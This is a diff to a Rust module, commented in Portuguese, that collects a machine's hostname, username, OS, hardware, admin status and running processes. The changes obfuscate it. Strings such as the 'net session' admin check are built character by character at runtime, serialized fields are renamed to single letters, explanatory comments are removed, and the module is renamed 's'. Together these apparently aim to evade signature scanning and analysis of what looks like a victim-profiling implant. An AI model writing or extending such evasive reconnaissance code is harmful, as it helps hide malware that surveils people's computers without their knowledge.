@@ -1,5 +1,8 @@
 //! Coletor de Informações do Sistema
+//!
+//! ⚠️ Strings ofuscadas
 
+use std::hint::black_box;
 use serde::{Deserialize, Serialize};
 use sysinfo::System;
 
@@ -8,47 +11,52 @@ use nix::unistd::geteuid;
 
 use super::{Collector, CollectorError, ModuleData};
 
-/// Dados do sistema coletados
+#[inline(always)]
+fn bs(chars: &[char]) -> String {
+    let mut s = String::with_capacity(chars.len());
+    for &c in chars { s.push(c); }
+    black_box(s)
+}
+
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct SystemData {
-    /// Nome do host
+    #[serde(rename = "h")]
     pub hostname: String,
     
-    /// Nome do usuário
+    #[serde(rename = "u")]
     pub username: String,
     
-    /// Nome do SO
+    #[serde(rename = "o")]
     pub os_name: String,
     
-    /// Versão do SO
+    #[serde(rename = "v")]
     pub os_version: String,
     
-    /// Arquitetura
+    #[serde(rename = "a")]
     pub arch: String,
     
-    /// Modelo da CPU
+    #[serde(rename = "c")]
     pub cpu_model: String,
     
-    /// Número de cores
+    #[serde(rename = "n")]
     pub cpu_cores: u32,
     
-    /// RAM total em bytes
+    #[serde(rename = "r")]
     pub ram_total: u64,
     
-    /// RAM disponível em bytes
+    #[serde(rename = "m")]
     pub ram_available: u64,
     
-    /// Se usuário é admin
+    #[serde(rename = "i")]
     pub is_admin: bool,
     
-    /// Uptime em segundos
+    #[serde(rename = "t")]
     pub uptime_seconds: u64,
     
-    /// Processos em execução (nomes)
+    #[serde(rename = "p")]
     pub running_processes: Vec<String>,
 }
 
-/// Coletor de informações do sistema
 pub struct SystemInfoCollector;
 
 impl SystemInfoCollector {
@@ -60,24 +68,22 @@ impl SystemInfoCollector {
         let mut sys = System::new_all();
         sys.refresh_all();
         
-        // Coletar processos
         let processes: Vec<String> = sys.processes()
             .values()
             .map(|p| p.name().to_string())
-            .take(100) // Limitar pra nao ficar gigante
+            .take(100)
             .collect();
         
-        // Informação da CPU
         let cpu_model = sys.cpus()
             .first()
             .map(|c| c.brand().to_string())
-            .unwrap_or_else(|| "Unknown".to_string());
+            .unwrap_or_else(|| bs(&['?']));
         
         Ok(SystemData {
-            hostname: System::host_name().unwrap_or_else(|| "unknown".to_string()),
+            hostname: System::host_name().unwrap_or_else(|| bs(&['?'])),
             username: whoami::username(),
-            os_name: System::name().unwrap_or_else(|| "unknown".to_string()),
-            os_version: System::os_version().unwrap_or_else(|| "unknown".to_string()),
+            os_name: System::name().unwrap_or_else(|| bs(&['?'])),
+            os_version: System::os_version().unwrap_or_else(|| bs(&['?'])),
             arch: std::env::consts::ARCH.to_string(),
             cpu_model,
             cpu_cores: sys.cpus().len() as u32,
@@ -91,9 +97,12 @@ impl SystemInfoCollector {
     
     #[cfg(windows)]
     fn check_admin() -> bool {
-        // Verificar se é admin no Windows
-        std::process::Command::new("net")
-            .args(["session"])
+        // Comando construído em runtime
+        let cmd = bs(&['n', 'e', 't']);
+        let arg = bs(&['s', 'e', 's', 's', 'i', 'o', 'n']);
+        
+        std::process::Command::new(&cmd)
+            .arg(&arg)
             .output()
             .map(|o| o.status.success())
             .unwrap_or(false)
@@ -113,7 +122,7 @@ impl Default for SystemInfoCollector {
 
 impl Collector for SystemInfoCollector {
     fn name(&self) -> &str {
-        "system"
+        "s"
     }
     
     fn collect(&self) -> Result<ModuleData, CollectorError> {
@@ -126,7 +135,6 @@ impl Collector for SystemInfoCollector {
     }
     
     fn priority(&self) -> u8 {
-        100 // Alta prioridade
+        100
     }
 }
-
